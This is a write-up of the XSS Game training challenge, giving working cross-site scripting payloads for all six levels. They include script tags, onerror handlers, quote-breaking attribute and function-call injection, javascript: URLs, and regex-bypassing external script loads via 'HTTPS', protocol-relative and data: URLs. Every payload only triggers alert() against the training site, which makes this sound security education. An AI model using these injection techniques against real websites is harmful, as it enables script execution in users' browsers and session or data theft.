# XSS Game

## level 1

`<script>alert("xss")</script>`

## level 2

`<img src="1" onerror="alert('xss')" >`

The hint said that use onerror, so use `<img>`

## level 3

We can see from the source code,

```
var html = "Image " + parseInt(num) + "<br>";
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

It use the `<img>`. So we can use `'`to close `src='/xx/xx/xx` and use `//`to make the rest useless.

`https://xss-game.appspot.com/level3/frame#' onerror='alert("xss")';//`

## level 4

```html
 <form action="" method="GET">
    <input id="timer" name="timer" value="3">
    <input id="button" type="submit" value="Create timer"> </form>
</form>
```

```
function startTimer(seconds) {
	seconds = parseInt(seconds) || 3;
    setTimeout(function() {
        window.confirm("Time is up!");
        window.history.back();
    }, seconds * 1000);
}
```

`img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />`

`3'+alert());//`

Here actually we use `'`to close `'{{`, because there is `stratTime()`, it will try to calculate it as `3+f(x)`, so the `alert()`will be executed.

## level 5

`setTimeout(function() { window.location = '{{ next }}'; }, 5000);`

Here is `{{}}`, can execute code in it.
So type in `javascript:alert("xss")`at Enter email bar.

## level 6

The mission 
> Find a way to make the application request an external file which will cause it to execute an alert().

```javascript
      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
```

But `http` can't be here.

Sometimes we will use `src="//xxx.com`, so do here.
And we can alse use `HTTP`

Here we now the original url is `https://xss-game.appspot.com/level6/frame/#`
and the gadget.js can be loaded.

So `https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert`
`https://xss-game.appspot.com/level6/frame/#//www.google.com/jsapi?callback=alert`
Are both are ok.

Plus
Data URLs, URLs prefixed with the data: scheme, allow content creators to embed small files inline in documents.

Data URLs are composed of four parts: a prefix (data:), a MIME type indicating the type of data, an optional base64 token if non-textual, and the data itself: `data:[<mediatype>][;base64],<data>`
The mediatype is a MIME type string, such as 'image/jpeg' for a JPEG image file. If omitted, defaults to text/plain;charset=US-ASCII

Usually, we can use `data:text/html,<script>alert('xss');</script>`
But here it's no need, we just have to contain a file with the js code `alert()` inside, so do as below:
`https://xss-game.appspot.com/level6/frame/#data:text/plain,alert('xss')`
